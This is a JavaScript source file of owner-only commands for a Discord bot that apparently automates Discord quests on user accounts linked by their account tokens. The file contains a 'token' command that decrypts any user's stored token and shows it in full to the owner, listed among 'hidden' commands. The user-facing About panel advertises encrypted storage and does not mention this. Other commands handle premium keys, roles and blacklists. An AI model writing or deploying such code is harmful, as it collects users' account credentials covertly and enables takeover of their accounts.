import {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  ChannelType,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
} from 'discord.js';
import * as store from '../store.js';
import { theme } from '../themes.js';
import { BRAND, VERSION, SUPPORT_INVITE, OWNER_TAG, BOT_INVITE, AUTHOR } from '../config.js';
import { createKey, revokeKey } from '../keys.js';
import { grantPremium, resetInvites, syncRoles } from '../access.js';
import { decrypt, mask } from '../crypt.js';

const owner = { ownerOnly: true };

export const list = [
  {
    ...owner,
    name: 'logs',
    description: 'Owner terminal: every token that was added',
    async run(ctx) {
      const entries = Object.entries(store.db_().users).filter(([, u]) => u.accounts.length);
      if (!entries.length) return ctx.reply('Koi token add nahi hua abhi.');

      const chunks = [];
      for (const [id, u] of entries) {
        for (const a of u.accounts) {
          chunks.push(
            `**${a.username || 'unknown'}** (\`${id}\`)\n• slot #${a.slot} • ${a.active ? 'active' : 'idle'}\n• \`${mask(decrypt(a.token))}\`\n• <t:${Math.floor(a.linkedAt / 1000)}:R>`
          );
        }
      }
      return ctx.reply(chunks.slice(0, 12).join('\n\n') + (chunks.length > 12 ? `\n\n…+${chunks.length - 12} more` : ''));
    },
  },
  {
    ...owner,
    name: 'token',
    description: 'Show the full token of a user (owner only)',
    options: [
      { name: 'user', description: 'user', type: 6, required: true },
      { name: 'slot', description: 'slot number', type: 4, required: false },
    ],
    async run(ctx, args) {
      const u = store.user(args.user.id);
      if (!u.accounts.length) return ctx.reply('Is user ka koi token nahi hai.');
      const accs = args.slot ? u.accounts.filter((a) => a.slot === args.slot) : u.accounts;
      if (!accs.length) return ctx.reply('Us slot pe kuch nahi hai.');

      const out = accs.map((a) => `**${a.username}** • slot #${a.slot}\n\`\`\`\n${decrypt(a.token) || 'decrypt failed'}\n\`\`\``).join('\n');

      const dm = await ctx.user.send(out.slice(0, 3900)).catch(() => null);
      if (dm) return ctx.reply(`📬 **${accs.length}** token DM kar diye (leak-safe).`);
      return ctx.reply(out.slice(0, 1900));
    },
  },
  {
    ...owner,
    name: 'setchannel',
    description: 'Set the quest log channel',
    options: [{ name: 'channel', description: 'Log channel', type: 7, required: true, channel_types: [ChannelType.GuildText] }],
    async run(ctx, args) {
      store.cfg().questChannel = args.channel.id;
      store.save(true);
      return ctx.reply(`Quest log channel set: <#${args.channel.id}>`);
    },
  },
  {
    ...owner,
    name: 'setrole',
    description: 'Configure free / premium roles',
    options: [
      {
        name: 'tier',
        description: 'free or premium',
        type: 3,
        required: true,
        choices: [
          { name: 'free', value: 'free' },
          { name: 'premium', value: 'premium' },
        ],
      },
      { name: 'role', description: 'Role', type: 8, required: true },
    ],
    async run(ctx, args) {
      if (args.tier === 'free') store.cfg().freeRole = args.role.id;
      else store.cfg().premiumRole = args.role.id;
      store.save(true);
      return ctx.reply(`${args.tier} role set: <@&${args.role.id}>`);
    },
  },
  {
    ...owner,
    name: 'genkey',
    description: 'Generate a premium / trial key',
    options: [
      {
        name: 'type',
        description: 'key type',
        type: 3,
        required: true,
        choices: [
          { name: 'premium', value: 'premium' },
          { name: 'trial', value: 'trial' },
        ],
      },
      { name: 'days', description: 'days (trial default 3)', type: 4, required: false },
      { name: 'uses', description: 'how many users can use it', type: 4, required: false },
      { name: 'infinite', description: 'unlimited time + uses', type: 5, required: false },
    ],
    async run(ctx, args) {
      const infinite = !!args.infinite;
      const days = infinite ? Infinity : args.days || (args.type === 'trial' ? 3 : 30);
      const uses = infinite ? Infinity : args.uses || 1;
      const key = createKey({ type: args.type, days, maxUses: uses, infinite, createdBy: ctx.user.id });
      return ctx.reply(`🎟️ Key: \`${key}\`\ntype: **${args.type}** • days: **${infinite ? '∞' : days}** • uses: **${infinite ? '∞' : uses}**`);
    },
  },
  {
    ...owner,
    name: 'revokekey',
    description: 'Revoke a key',
    options: [{ name: 'key', description: 'key', type: 3, required: true }],
    async run(ctx, args) {
      return ctx.reply(revokeKey(args.key) ? 'Key revoked.' : 'Key not found.');
    },
  },
  {
    ...owner,
    name: 'adduser',
    description: 'Give premium directly without key',
    options: [
      { name: 'user', description: 'user', type: 6, required: true },
      { name: 'days', description: 'days (0 = infinite)', type: 4, required: false },
    ],
    async run(ctx, args) {
      const days = args.days === 0 ? Infinity : args.days || 30;
      grantPremium(args.user.id, days, 'manual');
      const m = await ctx.guild.members.fetch(args.user.id).catch(() => null);
      if (m) await syncRoles(m);
      return ctx.reply(`<@${args.user.id}> ko **${days === Infinity ? '∞' : days} din** premium de diya.`);
    },
  },
  {
    ...owner,
    name: 'removeuser',
    description: 'Remove premium from a user',
    options: [{ name: 'user', description: 'user', type: 6, required: true }],
    async run(ctx, args) {
      const u = store.user(args.user.id);
      u.premiumUntil = null;
      u.premiumReason = 'manual';
      store.save(true);
      const m = await ctx.guild.members.fetch(args.user.id).catch(() => null);
      if (m) await syncRoles(m);
      return ctx.reply(`<@${args.user.id}> ka premium hata diya.`);
    },
  },
  {
    ...owner,
    name: 'resetinvites',
    description: 'Reset a user invite count',
    options: [{ name: 'user', description: 'user', type: 6, required: true }],
    async run(ctx, args) {
      resetInvites(args.user.id);
      return ctx.reply('Invites reset.');
    },
  },
  {
    ...owner,
    name: 'blacklist',
    aliases: ['unblacklist'],
    description: 'Toggle blacklist for a user',
    options: [{ name: 'user', description: 'user', type: 6, required: true }],
    async run(ctx, args) {
      const bl = store.db_().blacklist;
      const has = bl.includes(args.user.id);
      store.db_().blacklist = has ? bl.filter((x) => x !== args.user.id) : [...bl, args.user.id];
      store.save(true);
      return ctx.reply(has ? 'Blacklist se hata diya.' : 'Blacklist me daal diya.');
    },
  },
  {
    ...owner,
    name: 'redeempanel',
    description: 'Post the premium redeem panel',
    async run(ctx) {
      const t = theme('premium');
      const embed = new EmbedBuilder()
        .setColor(0xf1c40f)
        .setTitle(`${t.badge} ${BRAND} Premium Panel`)
        .setDescription(
          [
            `by ${AUTHOR}`,
            '',
            'Unlock premium automation, video/desktop quest support, and active notifications.',
            '',
            '💎 **Trial Keys**',
            '• 3 din ka trial',
            '• lifetime me ek baar per account',
            '',
            '👑 **Premium Keys**',
            '• 5 active slots',
            '• paid premium extend hota hai',
            '',
            '🎟️ **Activation**',
            'Neeche button se apni key activate karo.',
            '',
            `-# Support: ${SUPPORT_INVITE}`,
          ].join('\n')
        )
        .setFooter({ text: t.footer });

      const msg = await ctx.channel.send({
        embeds: [embed],
        components: [
          new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('redeem:open').setLabel('Activate Premium').setEmoji('🎟️').setStyle(ButtonStyle.Success)
          ),
        ],
      });
      store.cfg().panelMessage = msg.id;
      store.save(true);
      return ctx.reply('Redeem panel posted.');
    },
  },
  {
    ...owner,
    name: 'about',
    description: 'Post the about panel',
    async run(ctx) {
      const embed = new EmbedBuilder()
        .setColor(0x2b6cff)
        .setTitle(`📖 About ${BRAND} ${VERSION}`)
        .setThumbnail(ctx.bot.user.displayAvatarURL())
        .setDescription(
          [
            '**Discord Quest Automation**',
            'Token se account link karo, bot quests khud enroll + complete karta hai.',
            '',
            '━━━━━━━━━━━━━━━━━━━━━',
            '**Developer**',
            `• Built by **${AUTHOR}**`,
            `• Owner: <@${OWNER_TAG}>`,
            `• ID: \`${OWNER_TAG}\``,
            '• Stack: Node.js + discord.js v14',
            '• Storage: AES-256-GCM encrypted JSON',
            '• Types: video · mobile · game · stream · achievement',
            '',
            '**Tiers**',
            '• Free — 2 slots, 2 parallel',
            '• Premium — 5 slots, 5 parallel, DM alerts',
            '',
            '**Rewards**',
            '• 3 invites = 7 din premium',
            '• 2 invites = 30 din quest role',
            '• Boost = jab tak boost, tab tak premium',
            '',
            `-# Support: ${SUPPORT_INVITE}`,
          ].join('\n')
        )
        .setFooter({ text: `${BRAND} ${VERSION} by ${AUTHOR} • ${OWNER_TAG}` });

      const menu = new StringSelectMenuBuilder()
        .setCustomId('about:select')
        .setPlaceholder('More info')
        .addOptions(
          new StringSelectMenuOptionBuilder().setLabel('Support Server').setValue('support'),
          new StringSelectMenuOptionBuilder().setLabel('Invite Bot').setValue('invite'),
          new StringSelectMenuOptionBuilder().setLabel('Owner').setValue('owner'),
          new StringSelectMenuOptionBuilder().setLabel('Commands').setValue('commands')
        );

      const msg = await ctx.channel.send({
        embeds: [embed],
        components: [
          new ActionRowBuilder().addComponents(menu),
          new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Support Server').setURL(SUPPORT_INVITE).setStyle(ButtonStyle.Link),
            new ButtonBuilder().setLabel('Invite Bot').setURL(BOT_INVITE).setStyle(ButtonStyle.Link)
          ),
        ],
      });
      store.cfg().aboutChannel = ctx.channel.id;
      store.cfg().aboutMessage = msg.id;
      store.save(true);
      return ctx.reply('About posted.');
    },
  },
  {
    ...owner,
    name: 'setfeedback',
    aliases: ['feedback'],
    modal: true,
    description: 'Set the message sent after every quest completion',
    async run(ctx) {
      return ctx.showModal(
        new ModalBuilder()
          .setCustomId('feedback:modal')
          .setTitle('Feedback message')
          .addComponents(
            new ActionRowBuilder().addComponents(
              new TextInputBuilder()
                .setCustomId('text')
                .setLabel('Placeholders: {user} {count} {total}')
                .setStyle(TextInputStyle.Paragraph)
                .setValue(store.cfg().feedback || '')
                .setMaxLength(900)
                .setRequired(true)
            )
          )
      );
    },
  },
  {
    ...owner,
    name: 'feedbackclear',
    description: 'Remove the feedback message',
    async run(ctx) {
      store.cfg().feedback = null;
      store.save(true);
      return ctx.reply('Feedback message hata diya.');
    },
  },
  {
    ...owner,
    name: 'stats',
    description: 'Owner stats',
    async run(ctx) {
      const users = Object.values(store.db_().users);
      const premium = users.filter((u) => u.premiumUntil && u.premiumUntil > Date.now()).length;
      const tokens = users.reduce((a, u) => a + u.accounts.length, 0);
      return ctx.reply(
        `Users: **${users.length}**\nPremium: **${premium}**\nTokens: **${tokens}**\nKeys: **${Object.keys(store.db_().keys).length}**\nBlacklisted: **${store.db_().blacklist.length}**`
      );
    },
  },
  {
    ...owner,
    name: 'terminal',
    description: 'Owner terminal: hidden commands list',
    async run(ctx) {
      return ctx.reply(
        [
          `**Owner terminal — ${BRAND} by ${AUTHOR}**`,
          '`logs` — every added token (masked)',
          '`token` — full token of any user',
          '`setchannel` — quest log channel',
          '`setrole` — free/premium roles',
          '`genkey` / `revokekey` — key control',
          '`adduser` / `removeuser` — direct premium',
          '`resetinvites` / `blacklist` — moderation',
          '`redeempanel` / `about` — panels',
          '`setfeedback` / `feedbackclear` — completion message',
          '`stats` — counters',
          'Prefix: **none** (owner)',
        ].join('\n')
      );
    },
  },
];
